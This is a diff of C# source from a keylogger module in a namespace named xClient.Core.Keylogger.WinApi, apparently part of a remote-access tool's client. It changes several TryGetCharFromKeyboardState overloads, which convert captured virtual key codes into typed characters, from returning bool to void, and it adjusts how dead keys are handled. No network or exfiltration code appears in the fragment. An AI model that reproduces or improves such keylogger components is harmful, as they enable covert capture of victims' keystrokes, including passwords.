@@ -44,11 +44,11 @@ namespace xClient.Core.Keylogger.WinApi
         /// <param name="fuState"></param>
         /// <param name="chars"></param>
         /// <returns></returns>
-        internal static bool TryGetCharFromKeyboardState(int virtualKeyCode, int fuState, out char[] chars)
+        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int fuState, out char[] chars)
         {
             var dwhkl = GetActiveKeyboard();
             int scanCode = MapVirtualKeyEx(virtualKeyCode, (int) MapType.MAPVK_VK_TO_VSC, dwhkl);
-            return TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
+            TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
         }
 
         /// <summary>
@@ -59,10 +59,10 @@ namespace xClient.Core.Keylogger.WinApi
         /// <param name="fuState"></param>
         /// <param name="chars"></param>
         /// <returns></returns>
-        internal static bool TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, out char[] chars)
+        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, out char[] chars)
         {
             var dwhkl = GetActiveKeyboard(); //get the active keyboard layout
-            return TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
+            TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
         }
 
         /// <summary>
@@ -74,7 +74,7 @@ namespace xClient.Core.Keylogger.WinApi
         /// <param name="dwhkl"></param>
         /// <param name="chars"></param>
         /// <returns></returns>
-        internal static bool TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl, out char[] chars)
+        internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl, out char[] chars)
         {
             StringBuilder pwszBuff = new StringBuilder(64);
             KeyboardState keyboardState = KeyboardState.GetCurrent();
@@ -114,14 +114,15 @@ namespace xClient.Core.Keylogger.WinApi
             if (lastVirtualKeyCode != 0 && lastIsDead)
             {
                 StringBuilder sbTemp = new StringBuilder(5);
-                ToUnicodeEx(lastVirtualKeyCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, 0, dwhkl);
 
                 if (chars != null)
                 {
+                    ToUnicodeEx(lastVirtualKeyCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, 0, dwhkl);
+                    lastIsDead = false;
                     lastVirtualKeyCode = 0;
                 }
 
-                return true;
+                return;
             }
 
             lastScanCode = scanCode;
@@ -129,7 +130,7 @@ namespace xClient.Core.Keylogger.WinApi
             lastIsDead = isDead;
             lastKeyState = (byte[]) currentKeyboardState.Clone();
 
-            return true;
+            return;
         }
 
 
